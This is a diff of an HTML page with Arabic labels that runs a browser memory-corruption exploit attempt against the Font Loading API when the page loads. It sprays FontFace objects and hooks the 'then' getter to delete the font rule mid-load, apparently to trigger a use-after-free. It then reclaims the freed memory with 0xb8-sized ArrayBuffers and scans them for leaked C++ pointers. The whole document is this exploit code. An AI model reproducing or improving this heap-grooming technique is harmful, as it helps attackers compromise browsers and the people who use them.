@@ -2,12 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تفكيك جمود المكدس - المسار الصحيح</title>
+    <title>تحليل نطاق المستخدم المتقدم - اختبار الـ Primitives</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
-        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
+        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 450px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
         .log { margin-bottom: 8px; }
         .warn { color: #ffaa00; }
+        .success { color: #00ff00; font-weight: bold; }
     </style>
     
     <style id="s">
@@ -16,78 +17,99 @@
 </head>
 <body>
 
-    <h2>مراقبة التداخل المستقر والتدوير الداخلي</h2>
-    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المتصفح...</div>
+    <h2>فحص تداخل المعمارية (Userland Memory Alignment)</h2>
+    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المستند...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
-        function screenLog(msg, isWarn = false) {
+        function screenLog(msg, type = "normal") {
             const entry = document.createElement('div');
-            entry.className = isWarn ? 'log warn' : 'log';
+            if (type === "warn") entry.className = 'log warn';
+            else if (type === "success") entry.className = 'log success';
+            else entry.className = 'log';
             entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             consoleElement.appendChild(entry);
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        var bad_fonts = [];
+        // مصفوفات الفحص الهيكلي
+        var font_storage = [];
+        var array_storage = [];
 
-        function startExploitAnalysis() {
-            consoleElement.innerHTML = ""; 
-            screenLog("بدء تشغيل الفحص المستقر...");
+        function runUserlandExploration() {
+            consoleElement.innerHTML = "";
+            screenLog("بدء تشغيل هندسة الاستبدال النوعي للذاكرة...");
 
             try {
-                // إعداد الكائن الأساسي أوالاً دون حشو مسبق لمنع تجميد المحرك
+                // 1. حقن أولي خفيف لتجهيز الـ Heap Partition
+                for (let i = 0; i < 500; i++) {
+                    font_storage.push(new FontFace("init_font", "", {}));
+                }
+
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-                document.fonts.add(A);
+                font_storage.push(A);
                 void A.loaded;
 
                 let fired = false;
 
-                // كمين المقاطعة
+                // 2. إعداد كمين التداخل المنطقي
                 Object.defineProperty(FontFace.prototype, 'then', {
                     configurable: true,
                     get() {
                         if (!fired && this === A) {
                             fired = true;
-                            screenLog("!! تم تفعيل الكمين المنطقي بنجاح !!", true);
+                            screenLog("!! تم تفعيل المقاطعة المنطقية للـ Getter !!", "warn");
                             
-                            // الحذف الفوري للقاعدة داخل المقاطعة
+                            // حذف القاعدة لتهيئة الكائن للتحرير
                             try {
                                 document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم حذف القاعدة بنجاح.");
-                            } catch(e) { screenLog("خطأ الحذف: " + e.message, true); }
+                                screenLog("تم حذف قاعدة الخط الأصلية.");
+                            } catch(e) { screenLog("خطأ الحذف: " + e.message, "warn"); }
                             
-                            // الآن نقوم بعمل الإغراق الداخلي المستهدف لملء الفراغ برمجياً
-                            screenLog("جاري حجز كائنات الخطوط البديلة داخل الـ Getter...");
-                            for (var i = 0; i < 400; i++) {
-                                bad_fonts.push(new FontFace("font_spray", "", {}));
+                            // 3. هندسة الاستبدال: حقن مصفوفات بأحجام متطابقة فوراً لملء الفراغ
+                            screenLog("جاري محاولة ملء الفراغ الفيزيائي بـ ArrayBuffers...");
+                            for (let i = 0; i < 200; i++) {
+                                // تخصيص مصفوفات صغيرة بحجم يقارب حجم كائن الـ FontFace الأصلي في الذاكرة (0xb8)
+                                let ab = new ArrayBuffer(0xb8);
+                                array_storage.push(new Uint32Array(ab));
                             }
-                            screenLog("اكتمل حجز الكائنات البديلة.");
+                            screenLog("اكتملت عملية حشو المصفوفات البديلة.");
 
-                            // طلب القراءة المؤجلة لكسر الـ Pinning
+                            // تأجيل الفحص البرمجي لمراقبة محتويات المصفوفات
                             setTimeout(() => {
-                                screenLog("محاولة القراءة المؤجلة (offsetTop)...");
-                                let offset = document.body.offsetTop;
-                                screenLog("قيمة الـ Offset المسترجعة: " + offset);
-                            }, 25);
+                                screenLog("جاري فحص المصفوفات المحقونة للبحث عن أي مؤشرات نظام (Leaked Pointers)...");
+                                
+                                let leak_found = false;
+                                for (let i = 0; i < array_storage.length; i++) {
+                                    // الفحص الهندسي: لو نجح الاستبدال، ستتغير قيم المصفوفة من 0 إلى عناوين ذاكرة C++
+                                    if (array_storage[i][0] !== 0 || array_storage[i][1] !== 0) {
+                                        screenLog(`[نجاح] تم رصد تداخل ذاكرة في المصفوفة رقم: ${i}`, "success");
+                                        screenLog(`العنوان المسرب الأول: 0x${array_storage[i][0].toString(16)}`, "success");
+                                        leak_found = true;
+                                        break;
+                                    }
+                                }
+                                
+                                if (!leak_found) {
+                                    screenLog("المصفوفات لا تزال صفراً. المحرك حافظ على العزل الفيزيائي في هذه المحاولة.");
+                                }
+                            }, 50);
                         }
-                        
                         return function(resolve) { if (resolve) resolve(); };
                     }
                 });
 
-                screenLog("إطلاق طلب التحميل عبر الـ Layout Pipeline...");
+                // إطلاق الدالة لبدء عملية التداخل
                 document.fonts.load('1em x', 'AB');
 
             } catch (err) {
-                screenLog("خطأ عام: " + err.message, true);
+                screenLog("خطأ عام: " + err.message, "warn");
             }
         }
 
-        // الانتظار الآمن لتجنب OOM الدخول الأول
         window.onload = () => {
-            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية لتأمين البيئة...");
-            setTimeout(startExploitAnalysis, 1500);
+            screenLog("تم تحميل الصفحة بسلام. الانتظار 1.5 ثانية للاستقرار التام...");
+            setTimeout(runUserlandExploration, 1500);
         };
     </script>
 </body>
